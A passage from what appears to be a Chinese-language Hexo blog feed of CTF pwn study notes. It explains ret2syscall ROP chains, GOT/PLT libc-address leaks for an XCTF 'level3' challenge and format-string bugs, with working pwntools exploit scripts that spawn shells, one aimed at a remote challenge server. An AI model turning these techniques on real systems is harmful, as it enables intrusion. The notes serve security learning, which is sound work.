keyword">unsigned</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> fs<span class="token operator">/</span>read_write<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> read from a file descriptorDetails<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">.</span> sys_writeSyntax<span class="token punctuation">:</span> ssize_t <span class="token function">sys_write</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> fs<span class="token operator">/</span>read_write<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> write to a file descriptorDetails<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">.</span> sys_execveSyntax<span class="token punctuation">:</span> <span class="token keyword">int</span> <span class="token function">sys_execve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> pt_regs regs<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> arch<span class="token operator">/</span>i386<span class="token operator">/</span>kernel<span class="token operator">/</span>process<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> execute programDetails<span class="token punctuation">:</span></code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3TOts.png" alt=""></p><p>很容易发现ShellCode中的EAX = 0Xb = 11，EBX = &amp;(“/bin//sh”), ECX = EDX = 0，即执行了sys_execve(“/bin//sh”, 0, 0, 0)，通过/bin/sh软链接打开一个shell，所以我们可以在没有system函数的情况下打开shell。<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。</p><p>比如我们像得到shell可以执行这个函数：execve(“/bin/sh”,NULL,NULL)<br>那么：其中，该程序是 32 位，所以我们需要使得</p><pre><code>系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0</code></pre><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><pre class=" language-bash"><code class="language-bash">ROPgadget --binary rop  --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'eax'</span>  //搜寻pop eax 和retROPgadget --binary rop  --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'ebx'</span>  //搜寻pop ebx 和retROPgadget --binary rop  --string <span class="token string">'/bin/sh'</span>   //还可以找字符串，那当然也可以找system函数如果有的话ROPgadget --binary rop  --only <span class="token string">'int'</span>   //这个主要找 int 80h这个指令</code></pre><p>找到完地址后：<br><img src="https://s1.ax1x.com/2020/06/01/t3TzcV.png" alt=""><br>根据以上思路把payload像上面这样构造就好了<br>实战：ret2syscall这个例子<br>32位程序<br><img src="https://s1.ax1x.com/2020/06/01/t3TXhn.png" alt=""><br>IDA：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>溢出点就没搞步骤了：112个字符，既然没有system还开启了NX    那就用rop吧<br>因为没有system函数，那么我们就得构造execve的ROP链：<br>找pop eax ；ret 指令<br><img src="https://s1.ax1x.com/2020/06/01/t3Tvpq.png" alt=""><br>我们选第二个</p><p>找pop ebx；ret指令<br><img src="https://s1.ax1x.com/2020/06/01/t37CBF.png" alt=""><br>这里我们选倒数第5个：</p><pre class=" language-bash"><code class="language-bash">0x0806eb90 <span class="token keyword">:</span> pop edx <span class="token punctuation">;</span> pop ecx <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret //这个直接把另外两个包括了，我们构造的时候注意参数位置即可</code></pre><p>找int 80h指令<br><img src="https://s1.ax1x.com/2020/06/01/t379nU.png" alt=""></p><p>还有/bin/sh字符串<br><img src="https://s1.ax1x.com/2020/06/01/t37SXT.png" alt=""></p><p>万事具备！！<br>构造exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment" spellcheck="true">#0x080bb196 : pop eax ; ret</span>pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span><span class="token comment" spellcheck="true">#0x080be408 : /bin/sh</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x080be408</span><span class="token comment" spellcheck="true">#0x08049421 : int 0x80</span><span class="token comment" spellcheck="true">#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span>pop_edx_pop_ecx_pop_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>pop_edx_pop_ecx_pop_ebx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>  <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08049421</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"ret2syscall"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3Tx10.png" alt=""></p><p>（系统调用功能好可以参考System Call Number Definition<br>以及<a href="http://asm.sourceforge.net/syscall.html#2" target="_blank" rel="noopener">http://asm.sourceforge.net/syscall.html#2</a><br>或者 <a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a> 查找(推荐!)</p><p>启发：<a href="https://zhuanlan.zhihu.com/p/72951960（详细）" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/72951960（详细）</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BLOG</title>
      <link href="/2020/05/23/mass/"/>
      <url>/2020/05/23/mass/</url>
      
        <content type="html"><![CDATA[<pre><code>             hexo基本写文章操作：</code></pre><p>1：在自己本地blog文件夹git bash here<br><img src="https://s1.ax1x.com/2020/05/23/YjltX9.png" alt=""></p><p>2:在bash中：hexo n “name” 或是直接在_posts中写文章</p><p>3：文章中插入图片<br>    语法：</p><p>![图片alt](图片地址 ‘’图片title’’)</p><p>图片alt就是显示在图片下面的文字，相当于对图片内容的解释。<br>图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</p><p>4：图床：<a href="https://imgchr.com/matri_x" target="_blank" rel="noopener">https://imgchr.com/matri_x</a></p><p>5：hexo g //生成静态网页，用于测试<br>    hexo s  //打开本地服务器，结合用于测试<br>    hexo d  //上传到github发布</p>]]></content>
      
      
      <categories>
          
          <category> MASS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BLOG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析got，plt，libc</title>
      <link href="/2020/05/23/qian-xi-got-plt-libc/"/>
      <url>/2020/05/23/qian-xi-got-plt-libc/</url>
      
        <content type="html"><![CDATA[<p>见详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/104224260" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/104224260</a></p><p>在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该函数的got表地址，跳到got表上。这个表上面存放被引用函数的真实地址。<br>为了程序运行时的效率，还没有引用某个函数时程序不会连接启用包括此函数这样就使程序运行速度更快。</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj19c4.png" alt="picture1"></p><p>libc文件里面包含大量函数包括system，read，write还有字符串/bin/sh ，libc在被程序引用时会分配到一个地址也就是libc的首地址，然后里面的函数或被程序引用。</p><p>引用过程：<br>首先libc分配到一个地址，他里面的函数字符串什么的本来就有内部基于libc首地址的偏移量，这些偏移量都是可以用ELF指令解析libc文件再用搜寻指令查到。所以一旦libc被引用分配得首地址libc里面所包括的所有函数和字符串地址就都确定了。call函数时用上述的plt，got表跳转寻址，最后通过重定位got表得到真实函数地址。</p><p>对应题目：xctf pwn level3<br>1:file</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1m9O.png" alt="picture2"></p><p>2:checksec</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1VN6.png" alt="picture3"></p><p>可以栈溢出，NX开启：rop绕过</p><p>3：ida</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1kH1.png" alt="picture4"></p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1EAx.png" alt="picture5"></p><p>查看buf的栈空间发现可以溢出：溢出量140</p><p>所以现在的思路就是：payload = “A”*140 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>所以得有哦system函数和binsh字符串   注意此处system函数的构建：函数地址+返回地址+函数参数  很多情况都是在栈中这样构建函数</p><p>4：ida查看函数与字符串</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1FBR.png" alt="picture6"></p><p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p><p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p><p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p><p>exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.126.19.106"</span><span class="token punctuation">,</span><span class="token number">52825</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = process("level3")</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"level3"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc_32.so.6"</span><span class="token punctuation">)</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#write函数的plt地址</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#write函数的got地址，该地址存放write真实地址</span>main_addr <span class="token operator">=</span> <span class="token number">0x08048484</span> <span class="token comment" spellcheck="true">#main函数地址可以从ida直接看，也可以elf.symbols['main']搜索</span><span class="token comment" spellcheck="true">#print write_plt     </span><span class="token comment" spellcheck="true">#print write_got</span><span class="token comment" spellcheck="true">#print main_addr</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</span><span class="token comment" spellcheck="true">#p.recv()</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#sh.recv(4)是接受4个字节的输出，u32和p32功能相反</span><span class="token comment" spellcheck="true">#print write_addr</span>libc_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#减去了write的offset</span><span class="token comment" spellcheck="true">#print(hex(libc_addr))</span><span class="token comment" spellcheck="true">#print "libc"+hex(libc_addr)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#得到binsh真实地址</span><span class="token comment" spellcheck="true">#print "binsh_addr => "+hex(binsh_addr)</span>sys_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#得到system真实地址</span><span class="token keyword">print</span> <span class="token string">"sys_addr => "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#通过上次攻击返回地址位vulnerable函数可以再次攻击</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p><p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Format String Exploit</title>
      <link href="/2020/05/22/formal/"/>
      <url>/2020/05/22/formal/</url>
      
        <content type="html"><![CDATA[<pre><code>                   格式化字符串漏洞原理</code></pre><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。</p><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png" alt="函数"></p><p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下<br>some value   //未知量<br> 3.14 123456<br> addr of “red”<br> addr of format string: Color %s…</p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况<br>当前字符不是 %，直接输出到相应标准输出。<br>当前字符是 %， 继续读取下一个字符<br>如果没有字符，报错<br>如果下一个字符是 %, 输出 %<br>否则根据相应的字符，获取相应的参数，对其进行解析并输出</p><p>假设编写如下程序:<br>printf(“Color %s, Number %d, Float %4.2f”);<br>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为<br>1.解析其地址对应的字符串<br>2.解析其内容对应的整形值<br>3.解析其内容对应的浮点值</p><p>#以上来源于<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr</a></p><p>漏洞利用</p><p>1：程序崩溃<br>因为栈上会有很多权限不足的地址无法进行访问，利用无法访问地址使程序崩溃<br>一般输入多个%s即可<br>2：泄露内存<br>获取某个变量的值，或是某个变量对应的地址<br>例：<br>程序如下：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>简单编译并将防护关闭：gcc -m32 -fno-stack-protector -no-pie -o test test.c<br>（32位，关闭栈溢出防护，PIE）<br>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><p>获取栈变量数值：</p><pre class=" language-bash"><code class="language-bash">%08x.%08x.%08x00000001.22222222.ffffffff.%08x.%08x.%08xff9645f0.f7ee9410.0804849d</code></pre><p>以上可以看出我们确实得到了3个16进制的数据。我们用gdb继续深入</p><p>首先再printf下断点：<br>gdb-peda$ b printf<br>Breakpoint 1 at 0x8048330<br>继续运行：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ rStarting program: /home/hunter/PWN/formal/wiki/test1 %08x.%08x.%08x  //我们还是输入%08x.%08x.%08x回车继续运行，程序停在第一次调用printf处：<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:        call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:        sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    <span class="token punctuation">)</span>   //printf函数的返回地址0004<span class="token operator">|</span> 0xffffcfb0 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span> printf函数第一个参数即格式化字符串0008<span class="token operator">|</span> 0xffffcfb4 --<span class="token operator">></span> 0x1   //变量a的地址 （格式化字符串的第一个参数）0012<span class="token operator">|</span> 0xffffcfb8 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%08x.%08x.%08x"</span><span class="token punctuation">)</span>    //变量b，我不知道为啥是这么一大串，理论上是0x222222220016<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0xffffffff  //变量c0020<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>  该变量是我们输入的格式化字符串对应的地址 0024<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span>    <span class="token punctuation">(</span><span class="token punctuation">)</span> from /lib32/libc.so.6gdb-peda$ 继续执行：gdb-peda$ cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08x程序确实输出了每一个变量对应的数值，并停在第二个printf<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0x80484f9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+115<span class="token operator">></span>:    add    esp,0x10<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffcfcc --<span class="token operator">></span> 0x804849d <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+23<span class="token operator">></span>:    add    ebx,0x1b63<span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfd4 <span class="token punctuation">(</span><span class="token string">".%08x.%08x"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfd8 <span class="token punctuation">(</span><span class="token string">"x.%08x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ </code></pre><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ cContinuing.ffffcfd0.f7fcf410.0804849d<span class="token punctuation">[</span>Inferior 1 <span class="token punctuation">(</span>process 9574<span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span></code></pre><p>想获取栈变量数值，我们一般用%p代替%08x。</p><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p>可以用%n$x来对应栈中第n+1个参数，因为对于printf函数格式化字符串就是栈中第一个参数，而格式化字符串后面的数据就是该格式化字符串内将被替换的参数</p><p>gdb再次深入：</p><pre class=" language-bash"><code class="language-bash">Starting program: /home/hunter/PWN/formal/wiki/test1 %3<span class="token variable">$x</span><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span>EBX: 0x804a000 --<span class="token operator">></span> 0x8049f14 --<span class="token operator">></span> 0x1 ECX: 0x1 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd048 --<span class="token operator">></span> 0x0 ESP: 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    esp,0x20<span class="token punctuation">)</span>EIP: 0xf7e2db60 <span class="token punctuation">(</span><span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79<span class="token punctuation">)</span>EFLAGS: 0x296 <span class="token punctuation">(</span>carry PARITY ADJUST zero SIGN <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0xf7e2db5b <span class="token operator">&lt;</span>fprintf+27<span class="token operator">></span>:    ret       0xf7e2db5c:    xchg   ax,ax   0xf7e2db5e:    xchg   ax,ax<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    